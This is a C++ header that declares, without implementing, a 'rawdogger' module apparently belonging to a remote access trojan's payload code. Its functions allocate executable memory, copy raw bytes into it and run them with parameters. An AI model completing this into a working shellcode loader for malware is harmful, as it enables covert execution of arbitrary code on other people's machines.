#include <vector>
#include <string>
#include <stdexcept>
#include <cstring>
#include <functional>

namespace rat::paylaod::rawdogger {

bool allocateExecutableBuffer(size_t arg_Size, void** p2_Buffer);

bool releaseExecutableBuffer(void* p_Buffer, size_t arg_Size) noexcept;

bool flushInstructionCache(void* p_Buffer, size_t arg_Size);

bool copyToExecutableBuffer(void* p_Exec_Buffer, const uint8_t* p_Code, size_t arg_Size);

bool executeWithCleanup(void* p_Exec_Buffer, size_t Buffer_Size,
                          const std::vector<std::string>& arg_Params,
                          std::string& Response_Buffer,
                          const std::function<void()>& Pre_Exec_Checks = {});

bool rawByteExecute(uint8_t* Byte_Code, size_t Number_Bytes,
                       const std::vector<std::string>& arg_Parameters,
                       std::string& Response_Buffer);

}//rat::payload::rawdogger
